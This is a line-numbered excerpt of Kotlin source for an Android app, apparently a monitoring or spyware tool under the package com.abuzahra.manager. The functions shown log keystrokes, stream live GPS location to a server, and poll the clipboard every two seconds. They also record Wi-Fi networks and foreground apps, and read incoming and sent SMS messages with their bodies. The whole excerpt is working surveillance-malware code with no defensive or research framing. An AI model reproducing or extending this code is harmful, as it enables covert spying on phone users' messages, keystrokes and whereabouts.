   163→    fun appendKeylog(packageName: String, text: String, viewType: String = "text") {
   164→        if (keyloggerActive) {
   165→            val entry = KeylogEntry(
   166→                timestamp = System.currentTimeMillis(),
   167→                packageName = packageName,
   168→                text = text,
   169→                viewType = viewType
   170→            )
   171→            keylogBuffer.add(entry)
   172→            
   173→            // Limit buffer size
   174→            while (keylogBuffer.size > MAX_KEYLOG_SIZE) {
   175→                keylogBuffer.poll()
   176→            }
   177→            
   178→            // Save to file
   179→            saveKeylogToFile(entry)

   181→    }

   236→    fun locationLiveStart(context: Context, intervalSeconds: Int = 30): String {
   237→        if (locationTrackingActive) {
   238→            return "Location tracking already active"
   239→        }
   240→        
   241→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
   242→            != PackageManager.PERMISSION_GRANTED &&
   243→            ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) 
   244→            != PackageManager.PERMISSION_GRANTED) {
   245→            return "Location permission not granted"
   246→        }
   247→        
   248→        locationTrackingActive = true
   249→        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
   250→        
   251→        // Create location listener
   252→        locationListener = object : LocationListener {
   253→            override fun onLocationChanged(location: Location) {
   254→                addLocationToHistory(
   255→                    location.latitude,
   256→                    location.longitude,
   257→                    location.accuracy,
   258→                    location.speed,
   259→                    location.altitude,
   260→                    location.provider ?: "unknown"
   261→                )
   262→                
   263→                // Check geofences
   264→                checkGeofences(location.latitude, location.longitude, context)
   265→                
   266→                // Send to server
   267→                CoroutineScope(Dispatchers.IO).launch {
   268→                    try {
   269→                        ApiClient.sendLocation(
   270→                            context,
   271→                            location.latitude,
   272→                            location.longitude,
   273→                            location.accuracy
   274→                        )
   275→                    } catch (e: Exception) { Log.w(TAG, "sendLocation error", e) }
   276→                }
   277→            }
   278→            
   279→            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
   280→            override fun onProviderEnabled(provider: String) {}
   281→            override fun onProviderDisabled(provider: String) {}
   282→        }
   283→        
   284→        // Request updates
   285→        try {
   286→            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
   287→                lm.requestLocationUpdates(
   288→                    LocationManager.GPS_PROVIDER,
   289→                    (intervalSeconds * 1000).toLong(),
   290→                    10f,
   291→                    locationListener!!,
   292→                    Looper.getMainLooper()
   293→                )
   294→            }
   295→            
   296→            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
   297→                lm.requestLocationUpdates(
   298→                    LocationManager.NETWORK_PROVIDER,
   299→                    (intervalSeconds * 1000).toLong(),
   300→                    10f,
   301→                    locationListener!!,
   302→                    Looper.getMainLooper()
   303→                )
   304→            }
   305→            
   306→            // Get last known location immediately
   307→            val lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
   308→                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
   309→            
   310→            if (lastKnown != null) {
   311→                addLocationToHistory(
   312→                    lastKnown.latitude,
   313→                    lastKnown.longitude,
   314→                    lastKnown.accuracy,
   315→                    lastKnown.speed,
   316→                    lastKnown.altitude,
   317→                    lastKnown.provider ?: "unknown"
   318→                )
   319→            }
   320→            
   321→            return "Live location tracking started (interval: ${intervalSeconds}s)"
   322→        } catch (e: Exception) {
   323→            Log.e(TAG, "Location tracking start error", e)
   324→            locationTrackingActive = false
   325→            return "Error: ${e.message}"
   326→        }
   327→    }

   406→    // ===== GEO FENCING =====
   407→    fun geoAdd(params: Map<String, Any>): String {
   408→        val arg = params["arg"]?.toString() ?: ""
   409→        val parts = arg.split(",")
   410→        
   411→        return if (parts.size >= 2) {
   412→            val lat = parts[0].trim().toDoubleOrNull()
   413→            val lon = parts[1].trim().toDoubleOrNull()
   414→            val radius = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 500
   415→            val name = parts.getOrNull(3)?.trim()
   416→            
   417→            if (lat != null && lon != null) {
   418→                val fence = GeoFence(
   419→                    id = java.util.UUID.randomUUID().toString(),
   420→                    lat = lat,
   421→                    lon = lon,
   422→                    radius = radius,
   423→                    active = true,
   424→                    name = name
   425→                )
   426→                geoFences.add(fence)
   427→                saveGeofences()
   428→                "Geofence added: ${fence.id} at ($lat, $lon) radius ${radius}m"
   429→            } else {
   430→                "Invalid coordinates"
   431→            }
   432→        } else {
   433→            "Usage: lat,lon,radius,name"
   434→        }
   435→    }

   475→    private fun checkGeofences(lat: Double, lon: Double, context: Context) {
   476→        for (fence in geoFences.filter { it.active }) {
   477→            val distance = calculateDistance(lat, lon, fence.lat, fence.lon)
   478→            
   479→            if (distance <= fence.radius) {
   480→                // Buffer event locally
   481→                com.abuzahra.manager.EventBuffer.addEvent(
   482→                    "geofence_entered",
   483→                    mapOf(
   484→                        "fence_id" to fence.id,
   485→                        "fence_name" to (fence.name ?: "Unnamed"),
   486→                        "distance" to distance
   487→                    )
   488→                )
   489→            }
   490→        }
   491→    }
   492→    
   493→    private fun calculateDistance(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Float {
   494→        val results = FloatArray(1)
   495→        Location.distanceBetween(lat1, lon1, lat2, lon2, results)
   496→        return results[0]
   497→    }

   501→            val prefs = App.instance.getSharedPreferences("monitor", Context.MODE_PRIVATE)

   537→    // ===== CLIPBOARD MONITOR =====
   538→    fun clipboardMonitorStart(context: Context): String {
   539→        if (clipboardMonitorActive) {
   540→            return "Clipboard monitoring already active"
   541→        }
   542→        
   543→        clipboardMonitorActive = true
   544→        
   545→        clipboardJob = CoroutineScope(Dispatchers.IO).launch {
   546→            var lastClipboard = ""
   547→            
   548→            while (isActive && clipboardMonitorActive) {
   549→                try {
   550→                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
   551→                    val clip = clipboard.primaryClip
   552→                    
   553→                    if (clip != null && clip.itemCount > 0) {
   554→                        val text = clip.getItemAt(0).text?.toString() ?: ""
   555→                        
   556→                        if (text.isNotEmpty() && text != lastClipboard) {
   557→                            lastClipboard = text
   558→                            
   559→                            val entry = ClipboardEntry(
   560→                                timestamp = System.currentTimeMillis(),
   561→                                text = text,
   562→                                sourcePackage = clip.description?.label?.toString()
   563→                            )
   564→                            clipboardHistory.add(entry)
   565→                            
   566→                            while (clipboardHistory.size > MAX_CLIPBOARD_HISTORY) {
   567→                                clipboardHistory.poll()
   568→                            }
   569→                            
   570→                            // Buffer event locally
   571→                            com.abuzahra.manager.EventBuffer.addEvent(
   572→                                "clipboard_change",
   573→                                mapOf("text" to text.take(500))
   574→                            )
   575→                        }
   576→                    }
   577→                    
   578→                    delay(2000) // Check every 2 seconds
   579→                } catch (e: Exception) {
   580→                    Log.e(TAG, "Clipboard monitor error", e)
   581→                    delay(5000)
   582→                }
   583→            }
   584→        }
   585→        
   586→        return "Clipboard monitoring started"
   587→    }

   625→            while (isActive && wifiMonitorActive) {
   626→                try {
   627→                    val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
   628→                    
   629→                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
   630→                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
   631→                            != PackageManager.PERMISSION_GRANTED) {
   632→                            delay(30000)
   633→                            continue
   634→                        }
   635→                    }
   636→                    
   637→                    val currentWifi = wm.connectionInfo
   638→                    val ssid = currentWifi?.ssid?.toString() ?: "Not connected"
   639→                    
   640→                    if (ssid != lastWifi) {
   641→                        lastWifi = ssid
   642→                        
   643→                        // Buffer event locally
   644→                        com.abuzahra.manager.EventBuffer.addEvent(
   645→                            "wifi_change",
   646→                            mapOf("ssid" to ssid, "bssid" to (currentWifi?.bssid ?: ""))
   647→                        )
   648→                    }
   649→                    
   650→                    delay(30000) // Check every 30 seconds
   651→                } catch (e: Exception) {
   652→                    Log.e(TAG, "WiFi monitor error", e)
   653→                    delay(60000)
   654→                }
   655→            }
   656→        }
   657→        
   658→        return "WiFi monitoring started"
   659→    }

   670→    // ===== APP MONITOR =====
   671→    fun appMonitorStart(context: Context): String {
   672→        if (appMonitorActive) {
   673→            return "App monitoring already active"
   674→        }
   675→        
   676→        appMonitorActive = true
   677→        
   678→        appMonitorJob = CoroutineScope(Dispatchers.IO).launch {
   679→            var lastApp = ""
   680→            
   681→            while (isActive && appMonitorActive) {
   682→                try {
   683→                    // Get foreground app using usage stats
   684→                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
   685→                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.PACKAGE_USAGE_STATS) 
   686→                            == PackageManager.PERMISSION_GRANTED) {
   687→                            
   688→                            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) 
   689→                                as android.app.usage.UsageStatsManager
   690→                            
   691→                            val endTime = System.currentTimeMillis()
   692→                            val startTime = endTime - 60000
   693→                            
   694→                            val usageStats = usageStatsManager.queryUsageStats(
   695→                                android.app.usage.UsageStatsManager.INTERVAL_DAILY,
   696→                                startTime, endTime
   697→                            )
   698→                            
   699→                            val foregroundApp = usageStats
   700→                                .filter { it.lastTimeUsed > startTime }
   701→                                .maxByOrNull { it.lastTimeUsed }
   702→                                ?.packageName ?: ""
   703→                            
   704→                            if (foregroundApp.isNotEmpty() && foregroundApp != lastApp) {
   705→                                lastApp = foregroundApp
   706→                                
   707→                                val entry = AppUsageEntry(
   708→                                    timestamp = System.currentTimeMillis(),
   709→                                    packageName = foregroundApp,
   710→                                    eventType = "foreground",
   711→                                    duration = 0
   712→                                )
   713→                                appUsageLog.add(entry)
   714→                                
   715→                                // Buffer event locally
   716→                                com.abuzahra.manager.EventBuffer.addEvent(
   717→                                    "app_change",
   718→                                    mapOf("package" to foregroundApp)
   719→                                )
   720→                            }
   721→                        }
   722→                    }
   723→                    
   724→                    delay(5000) // Check every 5 seconds
   725→                } catch (e: Exception) {
   726→                    Log.e(TAG, "App monitor error", e)
   727→                    delay(10000)
   728→                }
   729→            }
   730→        }
   731→        
   732→        return "App monitoring started"
   733→    }

   760→        }
   761→        
   762→        smsMonitorActive = true
   763→        
   764→        smsMonitorJob = CoroutineScope(Dispatchers.IO).launch {
   765→            var lastSmsId = 0L
   766→            
   767→            while (isActive && smsMonitorActive) {
   768→                try {
   769→                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
   770→                        == PackageManager.PERMISSION_GRANTED) {
   771→                        
   772→                        val uri = Telephony.Sms.CONTENT_URI
   773→                        val projection = arrayOf(
   774→                            Telephony.Sms._ID,
   775→                            Telephony.Sms.ADDRESS,

   777→                            Telephony.Sms.DATE,
   778→                            Telephony.Sms.TYPE
   779→                        )
   780→                        
   781→                        context.contentResolver.query(uri, projection, null, null, "${Telephony.Sms._ID} DESC")?.use { cursor ->
   782→                            if (cursor.moveToFirst()) {
   783→                                val id = cursor.getLong(0)
   784→                                
   785→                                if (id > lastSmsId) {
   786→                                    lastSmsId = id
   787→                                    
   788→                                    val address = cursor.getString(1)
   789→                                    val body = cursor.getString(2)
   790→                                    val date = cursor.getLong(3)
   791→                                    val type = cursor.getInt(4)
   792→                                    
   793→                                    // Buffer event locally
   794→                                    com.abuzahra.manager.EventBuffer.addEvent(
   795→                                        "sms_received",
   796→                                        mapOf(
   797→                                            "from" to address,
   798→                                            "body" to body,
   799→                                            "type" to (if (type == 1) "received" else "sent")
   800→                                        )
   801→                                    )
   802→                                }
   803→                            }
   804→                        }
   805→                    }
   806→                    
   807→                    delay(10000) // Check every 10 seconds
   808→                } catch (e: Exception) {
   809→                    Log.e(TAG, "SMS monitor error", e)
   810→                    delay(30000)
   811→                }
   812→            }
   813→        }
   814→
